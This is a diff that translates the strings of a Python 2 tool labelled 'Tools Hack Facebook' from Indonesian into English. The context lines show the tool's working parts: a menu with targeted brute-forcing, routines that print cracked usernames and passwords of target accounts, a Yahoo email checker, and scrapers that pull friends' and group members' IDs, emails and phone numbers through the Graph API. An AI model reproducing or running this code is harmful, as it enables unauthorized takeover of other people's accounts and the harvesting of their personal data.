@@ -1,4 +1,5 @@
 #Decompiled by Ac3p_Cyb3r
+#Translated by l101l
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -23,7 +24,7 @@ def jalan(z):
         time.sleep(0.01)
 
 
-logo = ' Tools Hack Facebook \n\x1b[1;93m Author    : Ac3p_Cyb3r \n\x1b[1;93m My Team.  : Mouse Cyber Security \n\x1b[1;93m Thanks To : AI - Mrs.Meni'
+logo = ' Tools Hack Facebook \n\x1b[1;93m Author    : Ac3p_Cyb3r \n\x1b[1;93m My Team.  : Mouse Cyber Security \n\x1b[1;93m Thanks To : Jomer Pogi'
 def tik():
     titik = [
      '.   ', '..  ', '... ']
@@ -51,8 +52,8 @@ reaksigrup = []
 komen = []
 komengrup = []
 listgrup = []
-vulnot = '\x1b[31mGak Vuln'
-vuln = '\x1b[32mVuln'
+vulnot = '\x1b[31mNOT AVAILABLE'
+vuln = '\x1b[32mAVAILABLE'
 
 
 def login():
@@ -71,7 +72,7 @@ def login():
         try:
             br.open('https://m.facebook.com')
         except mechanize.URLError:
-            print '\n\x1b[1;91m[!] Tidak ada koneksi'
+            print '\n\x1b[1;91m[!] CONNECTION ERROR'
             keluar()
 
         br._factory.is_html = True
@@ -100,16 +101,16 @@ def login():
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
-                print '\n\x1b[1;91m[!] Tidak ada koneksi'
+                print '\n\x1b[1;91m[!] CONNECTION ERROR'
                 keluar()
 
         if 'checkpoint' in url:
-            print '\n\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+            print '\n\x1b[1;91m[!] \x1b[1;93mCHECKPOINT ALERT!'
             os.system('rm -rf login.txt')
             time.sleep(1)
             keluar()
         else:
-            print '\n\x1b[1;91m[!] Login Gagal'
+            print '\n\x1b[1;91m[!] Login ERROR'
             os.system('rm -rf login.txt')
             time.sleep(1)
             login()
@@ -133,12 +134,12 @@ def menu():
             id = a['id']
         except KeyError:
             os.system('clear')
-            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
+            print '\x1b[1;91m[!] \x1b[1;93mSepertinya CHECKPOINT ALERT!'
             os.system('rm -rf login.txt')
             time.sleep(1)
             login()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[!] Tidak ada koneksi'
+            print '\x1b[1;91m[!] CONNECTION ERROR'
             keluar()
 
     os.system('clear')
@@ -146,9 +147,9 @@ def menu():
     print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
     print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
     print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
-    print '\x1b[1;37;40m1. Informasi Pengguna'
-    print '\x1b[1;37;40m2. Hack Akun Facebook'
-    print '\x1b[1;37;40m3. Bot               '
+    print '\x1b[1;37;40m1. My Information    '
+    print '\x1b[1;37;40m2. Facebook Hacking  '
+    print '\x1b[1;37;40m3. Bots              '
     print '\x1b[1;37;40m4. Lainnya....       '
     print '\x1b[1;37;40m5. LogOut            '
     print '\x1b[1;31;40m0. Keluar            '
@@ -276,7 +277,7 @@ def menu_hack():
     print '\x1b[1;37;40m4. BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
     print '\x1b[1;37;40m5. Yahoo Checker'
     print '\x1b[1;37;40m6. Ambil id/email/hp'
-    print '\x1b[1;31;40m0. Kembali'
+    print '\x1b[1;31;40m0. Back'
     print
     hack_pilih()
 
@@ -352,7 +353,7 @@ def mini():
             else:
                 if 'www.facebook.com' in y['error_msg']:
                     print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
-                    print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                    print '\x1b[1;91m[!] \x1b[1;93mCHECKPOINT ALERT!'
                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
@@ -372,7 +373,7 @@ def mini():
                     else:
                         if 'www.facebook.com' in y['error_msg']:
                             print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
-                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                            print '\x1b[1;91m[!] \x1b[1;93mCHECKPOINT ALERT!'
                             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
@@ -392,7 +393,7 @@ def mini():
                             else:
                                 if 'www.facebook.com' in y['error_msg']:
                                     print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
-                                    print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                                    print '\x1b[1;91m[!] \x1b[1;93mCHECKPOINT ALERT!'
                                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
@@ -413,14 +414,14 @@ def mini():
                                     else:
                                         if 'www.facebook.com' in y['error_msg']:
                                             print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
-                                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                                            print '\x1b[1;91m[!] \x1b[1;93mCHECKPOINT ALERT!'
                                             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                                             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                             menu_hack()
                                         else:
-                                            print '\x1b[1;91m[!] Maaf, gagal membuka password target :('
+                                            print '\x1b[1;91m[!] Maaf, ERROR membuka password target :('
                                             print '\x1b[1;91m[!] Cobalah dengan cara lain.'
                                             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                             menu_hack()
@@ -504,7 +505,7 @@ def scrak():
         print '\n\x1b[1;91m[!] Koneksi terganggu'
         time.sleep(1)
     except requests.exceptions.ConnectionError:
-        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+        print '\x1b[1;91m[\xe2\x9c\x96] CONNECTION ERROR'
 
 
 def hasil():
@@ -517,7 +518,7 @@ def hasil():
         print c
 
     print
-    print '\x1b[31m[x] Gagal \x1b[1;97m--> ' + str(len(gagal))
+    print '\x1b[31m[x] ERROR \x1b[1;97m--> ' + str(len(gagal))
     keluar()
 
 
@@ -692,7 +693,7 @@ def brute():
                             ceks.close()
                             print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                             print 40 * '\x1b[1;97m\xe2\x95\x90'
-                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                            print '\x1b[1;91m[!] \x1b[1;93mCHECKPOINT ALERT!'
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                             keluar()
@@ -785,7 +786,7 @@ def yahoofriends():
     jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
     teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
     kimak = json.loads(teman.text)
-    save = open('MailVuln.txt', 'w')
+    save = open('jb.txt', 'w')
     print 40 * '\x1b[1;97m\xe2\x95\x90'
     for w in kimak['data']:
         jml += 1
@@ -824,7 +825,7 @@ def yahoofriends():
             pass
 
     print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
-    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
+    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m jb.txt'
     save.close()
     raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
     menu_yahoo()
@@ -855,7 +856,7 @@ def yahoolist():
     mpsh = []
     jml = 0
     jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
-    save = open('MailVuln.txt', 'w')
+    save = open('jb.txt', 'w')
     print 40 * '\x1b[1;97m\xe2\x95\x90'
     print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
     print
@@ -886,7 +887,7 @@ def yahoolist():
                 print '\x1b[1;91m ' + mail
 
     print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
-    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
+    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m jb.txt'
     save.close()
     raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
     menu_yahoo()
@@ -997,7 +998,7 @@ def id_teman():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             grab()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            print '\x1b[1;91m[\xe2\x9c\x96] CONNECTION ERROR'
             keluar()
 
 
@@ -1052,7 +1053,7 @@ def idfrom_teman():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             grab()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            print '\x1b[1;91m[\xe2\x9c\x96] CONNECTION ERROR'
             keluar()
 
 
@@ -1112,7 +1113,7 @@ def id_member_grup():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             grab()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            print '\x1b[1;91m[\xe2\x9c\x96] CONNECTION ERROR'
             keluar()
 
 
@@ -1167,7 +1168,7 @@ def email():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             grab()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            print '\x1b[1;91m[\xe2\x9c\x96] CONNECTION ERROR'
             keluar()
 
 
@@ -1227,7 +1228,7 @@ def emailfrom_teman():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             grab()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            print '\x1b[1;91m[\xe2\x9c\x96] CONNECTION ERROR'
             keluar()
 
 
@@ -1283,7 +1284,7 @@ def nomor_hp():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             grab()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            print '\x1b[1;91m[\xe2\x9c\x96] CONNECTION ERROR'
             keluar()
 
 
@@ -1343,7 +1344,7 @@ def hpfrom_teman():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             grab()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            print '\x1b[1;91m[\xe2\x9c\x96] CONNECTION ERROR'
             keluar()
 
 
@@ -1714,7 +1715,7 @@ def deletepost():
         ok = json.loads(url.text)
         try:
             error = ok['error']['message']
-            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mGagal'
+            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mERROR'
         except TypeError:
             print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mTerhapus'
             piro += 1
@@ -1755,7 +1756,7 @@ def accept():
         a = json.loads(gas.text)
         if 'error' in str(a):
             print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
-            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;91m Gagal'
+            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;91m ERROR'
             print 40 * '\x1b[1;97m\xe2\x95\x90'
         else:
             print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
@@ -1948,7 +1949,7 @@ def wordlist():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             lain()
         except IOError as e:
-            print '\x1b[1;91m[!] Gagal membuat file'
+            print '\x1b[1;91m[!] ERROR membuat file'
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             lain()
 
@@ -2045,7 +2046,7 @@ def grupsaya():
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             lain()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
+            print '\x1b[1;91m[\xe2\x9c\x96] CONNECTION ERROR'
             keluar()
         except IOError:
             print '\x1b[1;91m[!] Kesalahan saat membuat file'
